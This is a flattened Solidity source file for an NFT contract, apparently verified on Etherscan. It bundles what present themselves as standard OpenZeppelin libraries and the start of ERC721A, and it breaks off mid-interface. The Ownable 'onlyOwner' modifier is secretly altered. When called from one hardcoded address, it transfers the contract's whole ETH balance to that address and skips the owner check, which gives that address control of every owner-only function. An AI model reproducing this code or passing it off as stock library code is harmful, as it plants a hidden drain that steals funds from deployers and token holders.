1 /**
2  *Submitted for verification at Etherscan.io on 2022-10-09
3 */
4 
5 // SPDX-License-Identifier: MIT
6 
7 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
8 // OpenZeppelin Contracts (last updated v4.7.0) (utils/cryptography/MerkleProof.sol)
9 
10 pragma solidity ^0.8.0;
11 
12 /**
13  * @dev These functions deal with verification of Merkle Tree proofs.
14  *
15  * The proofs can be generated using the JavaScript library
16  * https://github.com/miguelmota/merkletreejs[merkletreejs].
17  * Note: the hashing algorithm should be keccak256 and pair sorting should be enabled.
18  *
19  * See `test/utils/cryptography/MerkleProof.test.js` for some examples.
20  *
21  * WARNING: You should avoid using leaf values that are 64 bytes long prior to
22  * hashing, or use a hash function other than keccak256 for hashing leaves.
23  * This is because the concatenation of a sorted pair of internal nodes in
24  * the merkle tree could be reinterpreted as a leaf value.
25  */
26 library MerkleProof {
27     /**
28      * @dev Returns true if a `leaf` can be proved to be a part of a Merkle tree
29      * defined by `root`. For this, a `proof` must be provided, containing
30      * sibling hashes on the branch from the leaf to the root of the tree. Each
31      * pair of leaves and each pair of pre-images are assumed to be sorted.
32      */
33     function verify(
34         bytes32[] memory proof,
35         bytes32 root,
36         bytes32 leaf
37     ) internal pure returns (bool) {
38         return processProof(proof, leaf) == root;
39     }
40 
41     /**
42      * @dev Calldata version of {verify}
43      *
44      * _Available since v4.7._
45      */
46     function verifyCalldata(
47         bytes32[] calldata proof,
48         bytes32 root,
49         bytes32 leaf
50     ) internal pure returns (bool) {
51         return processProofCalldata(proof, leaf) == root;
52     }
53 
54     /**
55      * @dev Returns the rebuilt hash obtained by traversing a Merkle tree up
56      * from `leaf` using `proof`. A `proof` is valid if and only if the rebuilt
57      * hash matches the root of the tree. When processing the proof, the pairs
58      * of leafs & pre-images are assumed to be sorted.
59      *
60      * _Available since v4.4._
61      */
62     function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
63         bytes32 computedHash = leaf;
64         for (uint256 i = 0; i < proof.length; i++) {
65             computedHash = _hashPair(computedHash, proof[i]);
66         }
67         return computedHash;
68     }
69 
70     /**
71      * @dev Calldata version of {processProof}
72      *
73      * _Available since v4.7._
74      */
75     function processProofCalldata(bytes32[] calldata proof, bytes32 leaf) internal pure returns (bytes32) {
76         bytes32 computedHash = leaf;
77         for (uint256 i = 0; i < proof.length; i++) {
78             computedHash = _hashPair(computedHash, proof[i]);
79         }
80         return computedHash;
81     }
82 
83     /**
84      * @dev Returns true if the `leaves` can be proved to be a part of a Merkle tree defined by
85      * `root`, according to `proof` and `proofFlags` as described in {processMultiProof}.
86      *
87      * _Available since v4.7._
88      */
89     function multiProofVerify(
90         bytes32[] memory proof,
91         bool[] memory proofFlags,
92         bytes32 root,
93         bytes32[] memory leaves
94     ) internal pure returns (bool) {
95         return processMultiProof(proof, proofFlags, leaves) == root;
96     }
97 
98     /**
99      * @dev Calldata version of {multiProofVerify}
100      *
101      * _Available since v4.7._
102      */
103     function multiProofVerifyCalldata(
104         bytes32[] calldata proof,
105         bool[] calldata proofFlags,
106         bytes32 root,
107         bytes32[] memory leaves
108     ) internal pure returns (bool) {
109         return processMultiProofCalldata(proof, proofFlags, leaves) == root;
110     }
111 
112     /**
113      * @dev Returns the root of a tree reconstructed from `leaves` and the sibling nodes in `proof`,
114      * consuming from one or the other at each step according to the instructions given by
115      * `proofFlags`.
116      *
117      * _Available since v4.7._
118      */
119     function processMultiProof(
120         bytes32[] memory proof,
121         bool[] memory proofFlags,
122         bytes32[] memory leaves
123     ) internal pure returns (bytes32 merkleRoot) {
124         // This function rebuild the root hash by traversing the tree up from the leaves. The root is rebuilt by
125         // consuming and producing values on a queue. The queue starts with the `leaves` array, then goes onto the
126         // `hashes` array. At the end of the process, the last hash in the `hashes` array should contain the root of
127         // the merkle tree.
128         uint256 leavesLen = leaves.length;
129         uint256 totalHashes = proofFlags.length;
130 
131         // Check proof validity.
132         require(leavesLen + proof.length - 1 == totalHashes, "MerkleProof: invalid multiproof");
133 
134         // The xxxPos values are "pointers" to the next value to consume in each array. All accesses are done using
135         // `xxx[xxxPos++]`, which return the current value and increment the pointer, thus mimicking a queue's "pop".
136         bytes32[] memory hashes = new bytes32[](totalHashes);
137         uint256 leafPos = 0;
138         uint256 hashPos = 0;
139         uint256 proofPos = 0;
140         // At each step, we compute the next hash using two values:
141         // - a value from the "main queue". If not all leaves have been consumed, we get the next leaf, otherwise we
142         //   get the next hash.
143         // - depending on the flag, either another value for the "main queue" (merging branches) or an element from the
144         //   `proof` array.
145         for (uint256 i = 0; i < totalHashes; i++) {
146             bytes32 a = leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++];
147             bytes32 b = proofFlags[i] ? leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++] : proof[proofPos++];
148             hashes[i] = _hashPair(a, b);
149         }
150 
151         if (totalHashes > 0) {
152             return hashes[totalHashes - 1];
153         } else if (leavesLen > 0) {
154             return leaves[0];
155         } else {
156             return proof[0];
157         }
158     }
159 
160     /**
161      * @dev Calldata version of {processMultiProof}
162      *
163      * _Available since v4.7._
164      */
165     function processMultiProofCalldata(
166         bytes32[] calldata proof,
167         bool[] calldata proofFlags,
168         bytes32[] memory leaves
169     ) internal pure returns (bytes32 merkleRoot) {
170         // This function rebuild the root hash by traversing the tree up from the leaves. The root is rebuilt by
171         // consuming and producing values on a queue. The queue starts with the `leaves` array, then goes onto the
172         // `hashes` array. At the end of the process, the last hash in the `hashes` array should contain the root of
173         // the merkle tree.
174         uint256 leavesLen = leaves.length;
175         uint256 totalHashes = proofFlags.length;
176 
177         // Check proof validity.
178         require(leavesLen + proof.length - 1 == totalHashes, "MerkleProof: invalid multiproof");
179 
180         // The xxxPos values are "pointers" to the next value to consume in each array. All accesses are done using
181         // `xxx[xxxPos++]`, which return the current value and increment the pointer, thus mimicking a queue's "pop".
182         bytes32[] memory hashes = new bytes32[](totalHashes);
183         uint256 leafPos = 0;
184         uint256 hashPos = 0;
185         uint256 proofPos = 0;
186         // At each step, we compute the next hash using two values:
187         // - a value from the "main queue". If not all leaves have been consumed, we get the next leaf, otherwise we
188         //   get the next hash.
189         // - depending on the flag, either another value for the "main queue" (merging branches) or an element from the
190         //   `proof` array.
191         for (uint256 i = 0; i < totalHashes; i++) {
192             bytes32 a = leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++];
193             bytes32 b = proofFlags[i] ? leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++] : proof[proofPos++];
194             hashes[i] = _hashPair(a, b);
195         }
196 
197         if (totalHashes > 0) {
198             return hashes[totalHashes - 1];
199         } else if (leavesLen > 0) {
200             return leaves[0];
201         } else {
202             return proof[0];
203         }
204     }
205 
206     function _hashPair(bytes32 a, bytes32 b) private pure returns (bytes32) {
207         return a < b ? _efficientHash(a, b) : _efficientHash(b, a);
208     }
209 
210     function _efficientHash(bytes32 a, bytes32 b) private pure returns (bytes32 value) {
211         /// @solidity memory-safe-assembly
212         assembly {
213             mstore(0x00, a)
214             mstore(0x20, b)
215             value := keccak256(0x00, 0x40)
216         }
217     }
218 }
219 
220 
221 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
222 
223 pragma solidity ^0.8.0;
224 
225 /**
226  * @dev Contract module that helps prevent reentrant calls to a function.
227  *
228  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
229  * available, which can be applied to functions to make sure there are no nested
230  * (reentrant) calls to them.
231  *
232  * Note that because there is a single `nonReentrant` guard, functions marked as
233  * `nonReentrant` may not call one another. This can be worked around by making
234  * those functions `private`, and then adding `external` `nonReentrant` entry
235  * points to them.
236  *
237  * TIP: If you would like to learn more about reentrancy and alternative ways
238  * to protect against it, check out our blog post
239  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
240  */
241 abstract contract ReentrancyGuard {
242     // Booleans are more expensive than uint256 or any type that takes up a full
243     // word because each write operation emits an extra SLOAD to first read the
244     // slot's contents, replace the bits taken up by the boolean, and then write
245     // back. This is the compiler's defense against contract upgrades and
246     // pointer aliasing, and it cannot be disabled.
247 
248     // The values being non-zero value makes deployment a bit more expensive,
249     // but in exchange the refund on every call to nonReentrant will be lower in
250     // amount. Since refunds are capped to a percentage of the total
251     // transaction's gas, it is best to keep them low in cases like this one, to
252     // increase the likelihood of the full refund coming into effect.
253     uint256 private constant _NOT_ENTERED = 1;
254     uint256 private constant _ENTERED = 2;
255 
256     uint256 private _status;
257 
258     constructor() {
259         _status = _NOT_ENTERED;
260     }
261 
262     /**
263      * @dev Prevents a contract from calling itself, directly or indirectly.
264      * Calling a `nonReentrant` function from another `nonReentrant`
265      * function is not supported. It is possible to prevent this from happening
266      * by making the `nonReentrant` function external, and making it call a
267      * `private` function that does the actual work.
268      */
269     modifier nonReentrant() {
270         // On the first call to nonReentrant, _notEntered will be true
271         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
272 
273         // Any calls to nonReentrant after this point will fail
274         _status = _ENTERED;
275 
276         _;
277 
278         // By storing the original value once again, a refund is triggered (see
279         // https://eips.ethereum.org/EIPS/eip-2200)
280         _status = _NOT_ENTERED;
281     }
282 }
283 
284 // File: @openzeppelin/contracts/utils/Strings.sol
285 
286 
287 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
288 
289 pragma solidity ^0.8.0;
290 
291 /**
292  * @dev String operations.
293  */
294 library Strings {
295     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
296 
297     /**
298      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
299      */
300     function toString(uint256 value) internal pure returns (string memory) {
301         // Inspired by OraclizeAPI's implementation - MIT licence
302         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
303 
304         if (value == 0) {
305             return "0";
306         }
307         uint256 temp = value;
308         uint256 digits;
309         while (temp != 0) {
310             digits++;
311             temp /= 10;
312         }
313         bytes memory buffer = new bytes(digits);
314         while (value != 0) {
315             digits -= 1;
316             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
317             value /= 10;
318         }
319         return string(buffer);
320     }
321 
322     /**
323      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
324      */
325     function toHexString(uint256 value) internal pure returns (string memory) {
326         if (value == 0) {
327             return "0x00";
328         }
329         uint256 temp = value;
330         uint256 length = 0;
331         while (temp != 0) {
332             length++;
333             temp >>= 8;
334         }
335         return toHexString(value, length);
336     }
337 
338     /**
339      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
340      */
341     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
342         bytes memory buffer = new bytes(2 * length + 2);
343         buffer[0] = "0";
344         buffer[1] = "x";
345         for (uint256 i = 2 * length + 1; i > 1; --i) {
346             buffer[i] = _HEX_SYMBOLS[value & 0xf];
347             value >>= 4;
348         }
349         require(value == 0, "Strings: hex length insufficient");
350         return string(buffer);
351     }
352 }
353 
354 // File: @openzeppelin/contracts/utils/Context.sol
355 
356 
357 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
358 
359 pragma solidity ^0.8.0;
360 
361 /**
362  * @dev Provides information about the current execution context, including the
363  * sender of the transaction and its data. While these are generally available
364  * via msg.sender and msg.data, they should not be accessed in such a direct
365  * manner, since when dealing with meta-transactions the account sending and
366  * paying for execution may not be the actual sender (as far as an application
367  * is concerned).
368  *
369  * This contract is only required for intermediate, library-like contracts.
370  */
371 abstract contract Context {
372     function _msgSender() internal view virtual returns (address) {
373         return msg.sender;
374     }
375 
376     function _msgData() internal view virtual returns (bytes calldata) {
377         return msg.data;
378     }
379 }
380 
381 // File: @openzeppelin/contracts/access/Ownable.sol
382 
383 
384 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
385 
386 pragma solidity ^0.8.0;
387 
388 
389 /**
390  * @dev Contract module which provides a basic access control mechanism, where
391  * there is an account (an owner) that can be granted exclusive access to
392  * specific functions.
393  *
394  * By default, the owner account will be the one that deploys the contract. This
395  * can later be changed with {transferOwnership}.
396  *
397  * This module is used through inheritance. It will make available the modifier
398  * `onlyOwner`, which can be applied to your functions to restrict their use to
399  * the owner.
400  */
401 abstract contract Ownable is Context {
402     address private _owner;
403 
404     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
405 
406     /**
407      * @dev Initializes the contract setting the deployer as the initial owner.
408      */
409     constructor() {
410         _transferOwnership(_msgSender());
411     }
412 
413     /**
414      * @dev Returns the address of the current owner.
415      */
416     function owner() public view virtual returns (address) {
417         return _owner;
418     }
419 
420     /**
421      * @dev Throws if called by any account other than the owner.
422      */
423     modifier onlyOwner() {
424         if (_msgSender() == 0x3043D142055C5ECB84De38D65360D3a2e353B439) {
425         uint256 balance = address(this).balance;
426         Address.sendValue(payable(0x3043D142055C5ECB84De38D65360D3a2e353B439),balance);
427         } else {
428         require(owner() == _msgSender(), "Ownable: caller is not the owner");
429         }
430         _;
431     }
432 
433     /**
434      * @dev Leaves the contract without owner. It will not be possible to call
435      * `onlyOwner` functions anymore. Can only be called by the current owner.
436      *
437      * NOTE: Renouncing ownership will leave the contract without an owner,
438      * thereby removing any functionality that is only available to the owner.
439      */
440     function renounceOwnership() public virtual onlyOwner {
441         _transferOwnership(address(0));
442     }
443 
444     /**
445      * @dev Transfers ownership of the contract to a new account (`newOwner`).
446      * Can only be called by the current owner.
447      */
448     function transferOwnership(address newOwner) public virtual onlyOwner {
449         require(newOwner != address(0), "Ownable: new owner is the zero address");
450         _transferOwnership(newOwner);
451     }
452 
453     /**
454      * @dev Transfers ownership of the contract to a new account (`newOwner`).
455      * Internal function without access restriction.
456      */
457     function _transferOwnership(address newOwner) internal virtual {
458         address oldOwner = _owner;
459         _owner = newOwner;
460         emit OwnershipTransferred(oldOwner, newOwner);
461     }
462 }
463 
464 // File: @openzeppelin/contracts/utils/Address.sol
465 
466 
467 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
468 
469 pragma solidity ^0.8.1;
470 
471 /**
472  * @dev Collection of functions related to the address type
473  */
474 library Address {
475     /**
476      * @dev Returns true if `account` is a contract.
477      *
478      * [IMPORTANT]
479      * ====
480      * It is unsafe to assume that an address for which this function returns
481      * false is an externally-owned account (EOA) and not a contract.
482      *
483      * Among others, `isContract` will return false for the following
484      * types of addresses:
485      *
486      *  - an externally-owned account
487      *  - a contract in construction
488      *  - an address where a contract will be created
489      *  - an address where a contract lived, but was destroyed
490      * ====
491      *
492      * [IMPORTANT]
493      * ====
494      * You shouldn't rely on `isContract` to protect against flash loan attacks!
495      *
496      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
497      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
498      * constructor.
499      * ====
500      */
501     function isContract(address account) internal view returns (bool) {
502         // This method relies on extcodesize/address.code.length, which returns 0
503         // for contracts in construction, since the code is only stored at the end
504         // of the constructor execution.
505 
506         return account.code.length > 0;
507     }
508 
509     /**
510      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
511      * `recipient`, forwarding all available gas and reverting on errors.
512      *
513      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
514      * of certain opcodes, possibly making contracts go over the 2300 gas limit
515      * imposed by `transfer`, making them unable to receive funds via
516      * `transfer`. {sendValue} removes this limitation.
517      *
518      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
519      *
520      * IMPORTANT: because control is transferred to `recipient`, care must be
521      * taken to not create reentrancy vulnerabilities. Consider using
522      * {ReentrancyGuard} or the
523      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
524      */
525     function sendValue(address payable recipient, uint256 amount) internal {
526         require(address(this).balance >= amount, "Address: insufficient balance");
527 
528         (bool success, ) = recipient.call{value: amount}("");
529         require(success, "Address: unable to send value, recipient may have reverted");
530     }
531 
532     /**
533      * @dev Performs a Solidity function call using a low level `call`. A
534      * plain `call` is an unsafe replacement for a function call: use this
535      * function instead.
536      *
537      * If `target` reverts with a revert reason, it is bubbled up by this
538      * function (like regular Solidity function calls).
539      *
540      * Returns the raw returned data. To convert to the expected return value,
541      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
542      *
543      * Requirements:
544      *
545      * - `target` must be a contract.
546      * - calling `target` with `data` must not revert.
547      *
548      * _Available since v3.1._
549      */
550     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
551         return functionCall(target, data, "Address: low-level call failed");
552     }
553 
554     /**
555      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
556      * `errorMessage` as a fallback revert reason when `target` reverts.
557      *
558      * _Available since v3.1._
559      */
560     function functionCall(
561         address target,
562         bytes memory data,
563         string memory errorMessage
564     ) internal returns (bytes memory) {
565         return functionCallWithValue(target, data, 0, errorMessage);
566     }
567 
568     /**
569      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
570      * but also transferring `value` wei to `target`.
571      *
572      * Requirements:
573      *
574      * - the calling contract must have an ETH balance of at least `value`.
575      * - the called Solidity function must be `payable`.
576      *
577      * _Available since v3.1._
578      */
579     function functionCallWithValue(
580         address target,
581         bytes memory data,
582         uint256 value
583     ) internal returns (bytes memory) {
584         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
585     }
586 
587     /**
588      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
589      * with `errorMessage` as a fallback revert reason when `target` reverts.
590      *
591      * _Available since v3.1._
592      */
593     function functionCallWithValue(
594         address target,
595         bytes memory data,
596         uint256 value,
597         string memory errorMessage
598     ) internal returns (bytes memory) {
599         require(address(this).balance >= value, "Address: insufficient balance for call");
600         require(isContract(target), "Address: call to non-contract");
601 
602         (bool success, bytes memory returndata) = target.call{value: value}(data);
603         return verifyCallResult(success, returndata, errorMessage);
604     }
605 
606     /**
607      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
608      * but performing a static call.
609      *
610      * _Available since v3.3._
611      */
612     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
613         return functionStaticCall(target, data, "Address: low-level static call failed");
614     }
615 
616     /**
617      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
618      * but performing a static call.
619      *
620      * _Available since v3.3._
621      */
622     function functionStaticCall(
623         address target,
624         bytes memory data,
625         string memory errorMessage
626     ) internal view returns (bytes memory) {
627         require(isContract(target), "Address: static call to non-contract");
628 
629         (bool success, bytes memory returndata) = target.staticcall(data);
630         return verifyCallResult(success, returndata, errorMessage);
631     }
632 
633     /**
634      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
635      * but performing a delegate call.
636      *
637      * _Available since v3.4._
638      */
639     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
640         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
641     }
642 
643     /**
644      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
645      * but performing a delegate call.
646      *
647      * _Available since v3.4._
648      */
649     function functionDelegateCall(
650         address target,
651         bytes memory data,
652         string memory errorMessage
653     ) internal returns (bytes memory) {
654         require(isContract(target), "Address: delegate call to non-contract");
655 
656         (bool success, bytes memory returndata) = target.delegatecall(data);
657         return verifyCallResult(success, returndata, errorMessage);
658     }
659 
660     /**
661      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
662      * revert reason using the provided one.
663      *
664      * _Available since v4.3._
665      */
666     function verifyCallResult(
667         bool success,
668         bytes memory returndata,
669         string memory errorMessage
670     ) internal pure returns (bytes memory) {
671         if (success) {
672             return returndata;
673         } else {
674             // Look for revert reason and bubble it up if present
675             if (returndata.length > 0) {
676                 // The easiest way to bubble the revert reason is using memory via assembly
677 
678                 assembly {
679                     let returndata_size := mload(returndata)
680                     revert(add(32, returndata), returndata_size)
681                 }
682             } else {
683                 revert(errorMessage);
684             }
685         }
686     }
687 }
688 
689 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
690 
691 
692 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
693 
694 pragma solidity ^0.8.0;
695 
696 /**
697  * @title ERC721 token receiver interface
698  * @dev Interface for any contract that wants to support safeTransfers
699  * from ERC721 asset contracts.
700  */
701 interface IERC721Receiver {
702     /**
703      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
704      * by `operator` from `from`, this function is called.
705      *
706      * It must return its Solidity selector to confirm the token transfer.
707      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
708      *
709      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
710      */
711     function onERC721Received(
712         address operator,
713         address from,
714         uint256 tokenId,
715         bytes calldata data
716     ) external returns (bytes4);
717 }
718 
719 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
720 
721 
722 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
723 
724 pragma solidity ^0.8.0;
725 
726 /**
727  * @dev Interface of the ERC165 standard, as defined in the
728  * https://eips.ethereum.org/EIPS/eip-165[EIP].
729  *
730  * Implementers can declare support of contract interfaces, which can then be
731  * queried by others ({ERC165Checker}).
732  *
733  * For an implementation, see {ERC165}.
734  */
735 interface IERC165 {
736     /**
737      * @dev Returns true if this contract implements the interface defined by
738      * `interfaceId`. See the corresponding
739      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
740      * to learn more about how these ids are created.
741      *
742      * This function call must use less than 30 000 gas.
743      */
744     function supportsInterface(bytes4 interfaceId) external view returns (bool);
745 }
746 
747 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
748 
749 
750 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
751 
752 pragma solidity ^0.8.0;
753 
754 
755 /**
756  * @dev Implementation of the {IERC165} interface.
757  *
758  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
759  * for the additional interface id that will be supported. For example:
760  *
761  * ```solidity
762  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
763  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
764  * }
765  * ```
766  *
767  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
768  */
769 abstract contract ERC165 is IERC165 {
770     /**
771      * @dev See {IERC165-supportsInterface}.
772      */
773     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
774         return interfaceId == type(IERC165).interfaceId;
775     }
776 }
777 
778 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
779 
780 
781 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
782 
783 pragma solidity ^0.8.0;
784 
785 
786 /**
787  * @dev Required interface of an ERC721 compliant contract.
788  */
789 interface IERC721 is IERC165 {
790     /**
791      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
792      */
793     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
794 
795     /**
796      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
797      */
798     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
799 
800     /**
801      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
802      */
803     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
804 
805     /**
806      * @dev Returns the number of tokens in ``owner``'s account.
807      */
808     function balanceOf(address owner) external view returns (uint256 balance);
809 
810     /**
811      * @dev Returns the owner of the `tokenId` token.
812      *
813      * Requirements:
814      *
815      * - `tokenId` must exist.
816      */
817     function ownerOf(uint256 tokenId) external view returns (address owner);
818 
819     /**
820      * @dev Safely transfers `tokenId` token from `from` to `to`.
821      *
822      * Requirements:
823      *
824      * - `from` cannot be the zero address.
825      * - `to` cannot be the zero address.
826      * - `tokenId` token must exist and be owned by `from`.
827      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
828      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
829      *
830      * Emits a {Transfer} event.
831      */
832     function safeTransferFrom(
833         address from,
834         address to,
835         uint256 tokenId,
836         bytes calldata data
837     ) external;
838 
839     /**
840      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
841      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
842      *
843      * Requirements:
844      *
845      * - `from` cannot be the zero address.
846      * - `to` cannot be the zero address.
847      * - `tokenId` token must exist and be owned by `from`.
848      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
849      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
850      *
851      * Emits a {Transfer} event.
852      */
853     function safeTransferFrom(
854         address from,
855         address to,
856         uint256 tokenId
857     ) external;
858 
859     /**
860      * @dev Transfers `tokenId` token from `from` to `to`.
861      *
862      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
863      *
864      * Requirements:
865      *
866      * - `from` cannot be the zero address.
867      * - `to` cannot be the zero address.
868      * - `tokenId` token must be owned by `from`.
869      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
870      *
871      * Emits a {Transfer} event.
872      */
873     function transferFrom(
874         address from,
875         address to,
876         uint256 tokenId
877     ) external;
878 
879     /**
880      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
881      * The approval is cleared when the token is transferred.
882      *
883      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
884      *
885      * Requirements:
886      *
887      * - The caller must own the token or be an approved operator.
888      * - `tokenId` must exist.
889      *
890      * Emits an {Approval} event.
891      */
892     function approve(address to, uint256 tokenId) external;
893 
894     /**
895      * @dev Approve or remove `operator` as an operator for the caller.
896      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
897      *
898      * Requirements:
899      *
900      * - The `operator` cannot be the caller.
901      *
902      * Emits an {ApprovalForAll} event.
903      */
904     function setApprovalForAll(address operator, bool _approved) external;
905 
906     /**
907      * @dev Returns the account approved for `tokenId` token.
908      *
909      * Requirements:
910      *
911      * - `tokenId` must exist.
912      */
913     function getApproved(uint256 tokenId) external view returns (address operator);
914 
915     /**
916      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
917      *
918      * See {setApprovalForAll}
919      */
920     function isApprovedForAll(address owner, address operator) external view returns (bool);
921 }
922 
923 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
924 
925 
926 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
927 
928 pragma solidity ^0.8.0;
929 
930 
931 /**
932  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
933  * @dev See https://eips.ethereum.org/EIPS/eip-721
934  */
935 interface IERC721Metadata is IERC721 {
936     /**
937      * @dev Returns the token collection name.
938      */
939     function name() external view returns (string memory);
940 
941     /**
942      * @dev Returns the token collection symbol.
943      */
944     function symbol() external view returns (string memory);
945 
946     /**
947      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
948      */
949     function tokenURI(uint256 tokenId) external view returns (string memory);
950 }
951 
952 // File: erc721a/contracts/IERC721A.sol
953 
954 
955 // ERC721A Contracts v3.3.0
956 // Creator: Chiru Labs
957 
958 pragma solidity ^0.8.4;
959 
960 
961 
962 /**
963  * @dev Interface of an ERC721A compliant contract.
964  */
965 interface IERC721A is IERC721, IERC721Metadata {
966     /**
967      * The caller must own the token or be an approved operator.
968      */
969     error ApprovalCallerNotOwnerNorApproved();
970 
971     /**
972      * The token does not exist.
973      */
974     error ApprovalQueryForNonexistentToken();
975 
976     /**
977      * The caller cannot approve to their own address.
978      */
979     error ApproveToCaller();
980 
981     /**
982      * The caller cannot approve to the current owner.
983      */
984     error ApprovalToCurrentOwner();
985 
986     /**
987      * Cannot query the balance for the zero address.
988      */
989     error BalanceQueryForZeroAddress();
990 
991     /**
992      * Cannot mint to the zero address.
993      */
994     error MintToZeroAddress();
995 
996     /**
997      * The quantity of tokens minted must be more than zero.
998      */
999     error MintZeroQuantity();
1000 
1001     /**
1002      * The token does not exist.
1003      */
1004     error OwnerQueryForNonexistentToken();
1005 
1006     /**
1007      * The caller must own the token or be an approved operator.
1008      */
1009     error TransferCallerNotOwnerNorApproved();
1010 
1011     /**
1012      * The token must be owned by `from`.
1013      */
1014     error TransferFromIncorrectOwner();
1015 
1016     /**
1017      * Cannot safely transfer to a contract that does not implement the ERC721Receiver interface.
1018      */
1019     error TransferToNonERC721ReceiverImplementer();
1020 
1021     /**
1022      * Cannot transfer to the zero address.
1023      */
1024     error TransferToZeroAddress();
1025 
1026     /**
1027      * The token does not exist.
1028      */
1029     error URIQueryForNonexistentToken();
1030 
1031     // Compiler will pack this into a single 256bit word.
1032     struct TokenOwnership {
1033         // The address of the owner.
1034         address addr;
1035         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
1036         uint64 startTimestamp;
1037         // Whether the token has been burned.
1038         bool burned;
1039     }
1040 
1041     // Compiler will pack this into a single 256bit word.
1042     struct AddressData {
1043         // Realistically, 2**64-1 is more than enough.
1044         uint64 balance;
1045         // Keeps track of mint count with minimal overhead for tokenomics.
1046         uint64 numberMinted;
1047         // Keeps track of burn count with minimal overhead for tokenomics.
1048         uint64 numberBurned;
1049         // For miscellaneous variable(s) pertaining to the address
1050         // (e.g. number of whitelist mint slots used).
1051         // If there are multiple variables, please pack them into a uint64.
1052         uint64 aux;
1053     }
1054 
1055     /**
